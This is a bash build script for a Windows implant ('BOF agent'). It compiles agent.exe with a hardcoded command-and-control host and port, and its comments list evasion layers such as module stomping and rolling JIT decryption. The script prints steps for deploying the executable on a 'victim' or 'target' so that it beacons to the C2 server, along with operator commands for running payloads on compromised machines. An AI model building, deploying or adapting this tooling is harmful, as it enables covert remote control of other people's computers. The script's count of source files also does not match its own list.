#!/usr/bin/env bash
# ============================================================
#  build.sh - Build the agent.exe (single-file BOF implant)
#
#  This script compiles agent/agent.c into dist/agent.exe,
#  baking in the hardcoded C2 server IP and port.
#
#  Usage:
#    ./build.sh                       # uses defaults (192.168.81.128:8080)
#    ./build.sh 192.168.81.128 8080   # custom IP and port
#    ./build.sh 10.0.0.5 9090 WIN_BOT_002   # custom ID too
#
#  After build:
#    - dist/agent.exe  (the single-file agent you deploy on victim)
#    - Run server.py first, then run agent.exe on Windows target.
# ============================================================

set -uo pipefail

# ---------- colors ----------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[X]${NC} $*" >&2; }

# ---------- args ----------
C2_HOST="${1:-192.168.81.128}"
C2_PORT="${2:-8080}"
AGENT_ID="${3:-WIN_BOT_001}"

# ---------- paths ----------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_DIR="$SCRIPT_DIR/agent"
DIST_DIR="$SCRIPT_DIR/dist"
OUT="$DIST_DIR/agent.exe"
mkdir -p "$DIST_DIR"

# All .c files in agent/ directory - compiled together into one agent.exe
# Phase 1: stomped_loader.c (module stomping)
# Phase 3: bof_crypto.c (HKDF + AES-GCM + HMAC crypto)
# Layer A: fragment_loader.c (multi-DLL fragmented stomping)
# Layer B: jit_engine.c (rolling JIT decryption)
# Layer C: chain_executor.c (phased chain execution)
AGENT_SOURCES=("$AGENT_DIR/main.c" "$AGENT_DIR/beacon_api.c" "$AGENT_DIR/stomped_loader.c" "$AGENT_DIR/http_client.c" "$AGENT_DIR/bof_crypto.c" "$AGENT_DIR/jit_engine.c" "$AGENT_DIR/chain_executor.c")

# ---------- locate compiler ----------
CC=""
CC_KIND=""
TARGET_FLAG=""

# 1) MinGW-w64 cross-compiler (Linux/WSL/Kali)
for cand in x86_64-w64-mingw32-gcc x86_64-w64-mingw32-gcc-posix mingw-w64-x86_64-gcc; do
    if command -v "$cand" >/dev/null 2>&1; then
        CC="$cand"
        CC_KIND="mingw"
        break
    fi
done

# 2) Zig (portable, single binary)
if [ -z "$CC" ]; then
    for cand in zig /usr/local/bin/zig /opt/zig/zig "$HOME/zig/zig"; do
        if command -v "$cand" >/dev/null 2>&1; then
            if "$cand" cc --version >/dev/null 2>&1; then
                CC="$cand cc"
                CC_KIND="zig"
                TARGET_FLAG="-target x86_64-windows-gnu"
                break
            fi
        fi
    done
fi

# 3) Native Windows gcc (MSYS2)
if [ -z "$CC" ]; then
    if command -v gcc >/dev/null 2>&1; then
        if gcc -dumpmachine 2>/dev/null | grep -qi 'w64-mingw'; then
            CC="gcc"
            CC_KIND="native"
        fi
    fi
fi

if [ -z "$CC" ]; then
    err "No suitable compiler found."
    cat <<EOM

Install one of:

  # MinGW-w64 cross-compiler (Kali/Ubuntu/WSL)
    sudo apt install gcc-mingw-w64-x86-64

  # OR Zig (single binary)
    https://ziglang.org/download/

  # OR Windows native (MSYS2 mingw shell)
    pacman -S mingw-w64-x86_64-gcc

EOM
    exit 1
fi

# ---------- banner ----------
echo
echo "========================================"
echo "  BOF Agent Build"
echo "========================================"
echo -e "  ${CYAN}Compiler  ${NC}  : $CC ($CC_KIND)"
echo -e "  ${CYAN}C2 Host   ${NC}  : $C2_HOST"
echo -e "  ${CYAN}C2 Port   ${NC}  : $C2_PORT"
echo -e "  ${CYAN}Agent ID  ${NC}  : $AGENT_ID"
echo -e "  ${CYAN}Sources   ${NC}  : ${AGENT_SOURCES[*]}"
echo -e "  ${CYAN}Output    ${NC}  : $OUT"
echo "========================================"
echo

# ---------- compile ----------
# -O2           : optimize
# -s            : strip symbols (smaller binary)
# -Wall         : warn all
# -DC2_HOST=... : bake server IP into binary
# -DC2_PORT=... : bake server port into binary
# -DAGENT_ID=...: bake agent ID into binary
# -lws2_32      : Winsock for HTTP client
# -lshlwapi     : PathFileExists etc (used by some helpers)
#
# CRITICAL: Use bash ARRAY (not a single string) for CFLAGS so quoting is
# preserved correctly. Old version had `\"\\\"$VAR\\\"\"` which produced
# strings like "\"192.168.81.128\"" (with embedded quotes) → inet_pton failed!
#
# With array, gcc receives literally: -DC2_HOST="192.168.81.128"
# which is the correct way to define a C string macro.

CFLAGS_ARGS=(
    $TARGET_FLAG
    -O2 -s -Wall
    -DC2_HOST="\"$C2_HOST\""
    -DC2_PORT="$C2_PORT"
    -DAGENT_ID="\"$AGENT_ID\""
)

log "Compiler will see these flags:"
printf '    [%s]\n' "${CFLAGS_ARGS[@]}"
echo

log "Compiling agent.exe (4 source files) ..."
if $CC "${CFLAGS_ARGS[@]}" "${AGENT_SOURCES[@]}" -o "$OUT" -lws2_32 -lshlwapi -lbcrypt 2> /tmp/build_agent_$$.err; then
    sz=$(stat -c%s "$OUT" 2>/dev/null || stat -f%z "$OUT" 2>/dev/null)
    ok "Built: agent.exe ($sz bytes)"
    if command -v file >/dev/null 2>&1; then
        ftype=$(file -b "$OUT")
        echo "    Type: $ftype"
    fi
    echo
    log "Deployment steps:"
    echo "    1. Make sure server.py is running:"
    echo "         python server/server.py"
    echo
    echo "    2. Copy dist/agent.exe to your Windows target"
    echo
    echo "    3. On Windows target, double-click or run agent.exe"
    echo "       It will beacon to $C2_HOST:$C2_PORT automatically"
    echo
    echo "    4. On server, you'll see agent check-in."
    echo "       Type 'help' in the server shell for commands."
    echo
    log "Available server commands:"
    echo "      list                          - show connected agents"
    echo "      use WIN_BOT_001               - select an agent"
    echo "      bof_exec bof_whoami           - execute BOF on selected agent"
    echo "      bof_exec bof_pwd              - execute another BOF"
    echo "      exit                          - quit server"
else
    err "Build failed:"
    sed 's/^/      /' /tmp/build_agent_$$.err | head -40
    rm -f /tmp/build_agent_$$.err
    exit 1
fi
rm -f /tmp/build_agent_$$.err
